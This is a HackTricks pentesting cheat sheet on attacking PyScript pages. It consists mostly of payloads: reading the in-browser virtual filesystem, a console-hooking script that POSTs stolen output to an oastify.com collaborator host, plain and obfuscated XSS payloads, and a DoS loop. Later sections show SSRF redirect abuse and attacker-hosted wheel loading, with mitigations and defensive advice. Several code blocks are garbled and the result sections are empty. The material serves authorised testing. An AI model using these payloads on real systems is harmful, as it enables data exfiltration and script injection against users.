---
title: "Pyscript"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-methodologies-and-resources/python/pyscript.html
fetched_at: 2026-09-20T08:53:25Z
license: unspecified
category: web
---

## PyScript Pentesting Guide

PyScript is a new framework developed for integrating Python into HTML so, it can be used alongside HTML. In this cheat sheet, you’ll find how to use PyScript for your penetration testing purposes.

### Dumping / Retrieving files from the Emscripten virtual memory filesystem:

`CVE ID: CVE-2022-30286`.[\[3\]](#references)[\[7\]](#references)

Code:

```
<py-script>
  with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
  = fin.read() print(out)
</py-script>
```
Result:

### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.[\[3\]](#references)[\[7\]](#references)

Code:

```
<py-script>
  x = "CyberGuy" if x == "CyberGuy": with
  open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
  print(contents) print('
  <script>
    console.pylog = console.log
    console.logs = []
    console.log = function () {
      console.logs.push(Array.from(arguments))
      console.pylog.apply(console, arguments)
      fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
        method: "POST",
        headers: { "Content-Type": "text/plain;charset=utf-8" },
        body: JSON.stringify({ content: btoa(console.logs) }),
      })
    }
  </script>
  ')
</py-script>
```
Result:

### Cross Site Scripting (Ordinary)

Code:

```
<py-script>
        print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Result:

### Cross Site Scripting (Python Obfuscated)

Code:

```
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"
print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Result:

### Cross Site Scripting (JavaScript Obfuscation)

Code:

```
<py-script>
  prinht(""
  <script>
    var _0x3675bf = _0x5cf5
    function _0x5cf5(_0xced4e9, _0x1ae724) {
      var _0x599cad = _0x599c()
      return (
        (_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
          _0x5cf5d2 = _0x5cf5d2 - 0x94
          var _0x14caa7 = _0x599cad[_0x5cf5d2]
          return _0x14caa7
        }),
        _0x5cf5(_0xced4e9, _0x1ae724)
      )
    }
    ;(function (_0x5ad362, _0x98a567) {
      var _0x459bc5 = _0x5cf5,
        _0x454121 = _0x5ad362()
      while (!![]) {
        try {
          var _0x168170 =
            (-parseInt(_0x459bc5(0x9e)) / 0x1) *
              (parseInt(_0x459bc5(0x95)) / 0x2) +
            (parseInt(_0x459bc5(0x97)) / 0x3) *
              (-parseInt(_0x459bc5(0x9c)) / 0x4) +
            -parseInt(_0x459bc5(0x99)) / 0x5 +
            (-parseInt(_0x459bc5(0x9f)) / 0x6) *
              (parseInt(_0x459bc5(0x9d)) / 0x7) +
            (-parseInt(_0x459bc5(0x9b)) / 0x8) *
              (-parseInt(_0x459bc5(0x9a)) / 0x9) +
            -parseInt(_0x459bc5(0x94)) / 0xa +
            (parseInt(_0x459bc5(0x98)) / 0xb) *
              (parseInt(_0x459bc5(0x96)) / 0xc)
          if (_0x168170 === _0x98a567) break
          else _0x454121["push"](_0x454121["shift"]())
        } catch (_0x5baa73) {
          _0x454121["push"](_0x454121["shift"]())
        }
      }
    })(_0x599c, 0x28895),
      prompt(document[_0x3675bf(0xa0)])
    function _0x599c() {
      var _0x34a15f = [
        "15170376Sgmhnu",
        "589203pPKatg",
        "11BaafMZ",
        "445905MAsUXq",
        "432bhVZQo",
        "14792bfmdlY",
        "4FKyEje",
        "92890jvCozd",
        "36031bizdfX",
        "114QrRNWp",
        "domain",
        "3249220MUVofX",
        "18cpppdr",
      ]
      _0x599c = function () {
        return _0x34a15f
      }
      return _0x599c()
    }
  </script>
  "")
</py-script>
```
Result:

### DoS attack (Infinity loop)

Code:

```
<py-script>
  while True:
  print("                              ")
</py-script>
```
Result:

## New vulnerabilities & techniques (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignores the `redirect` and `retries` request parameters when used with Pyodide’s browser transport. If an attacker can influence target URLs, the code may follow cross-domain redirects even when it asks urllib3 to disable them, undermining SSRF defenses.[\[1\]](#references)[\[4\]](#references)

```
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
    "GET",
    "https://evil.example/302",
    retries=False,
    redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Upgrade to `urllib3 >= 2.5.0` for Node.js, but do not rely on urllib3 to disable redirects in browsers; validate or allow-list destinations before making requests instead.[\[4\]](#references)

### Arbitrary package loading & supply-chain attacks

PyScript’s Pyodide configuration accepts arbitrary wheel URLs in `packages`; if an attacker can modify or inject that configuration, a subsequent import can execute attacker-controlled Python in the victim’s browser.[\[5\]](#references)[\[6\]](#references)

```
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide can install pure-Python wheels from arbitrary URLs without a WebAssembly build of the package.<sup>[\[6\]](#references)</sup> Keep this configuration developer-controlled, allow-list exact package names or URLs, and verify remote wheel digests during build or deployment.

### Output sanitisation changes (2023+)

- In the 2022.05.1 implementation used by the legacy examples, `print()` writes`text/plain` output without HTML escaping and is therefore XSS-prone.<sup>[\[8\]](#references)</sup>
- The current `display()` helper**escapes HTML by default** for plain strings; raw markup must be wrapped in`pyscript.HTML()` .<sup>[\[2\]](#references)</sup>

```
from pyscript import display, HTML
display("<b>escaped</b>")          # renders literally
display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Use `display()` for untrusted input and do not pass untrusted strings to `HTML()`.[\[2\]](#references)

## Defensive Best Practices

- **Keep packages up to date** – use`urllib3 >= 2.5.0` in Node.js and review browser redirect assumptions separately.<sup>[\[4\]](#references)</sup>
- **Restrict package sources** – allow-list PyPI names or exact trusted URLs, and verify remote wheel digests during build or deployment.<sup>[\[5\]](#references)[\[6\]](#references)</sup>
- **Harden Content Security Policy** – disallow inline JavaScript (`script-src 'self' 'sha256-…'` ) so that injected`<script>` blocks cannot execute.
- **Disallow user-supplied `<py-script>` / `<script type="py">` tags** – sanitise HTML on the server before echoing it back to other users.
- **Isolate workers** – if you do not need synchronous access to the DOM from workers, enable the`sync_main_only` flag to avoid`SharedArrayBuffer` and its associated CORS header requirements.<sup>[\[5\]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3 security advisory – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript configuration documentation – packages and `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Loading packages](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript 2022.05.1 `pyscript.py` implementation](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
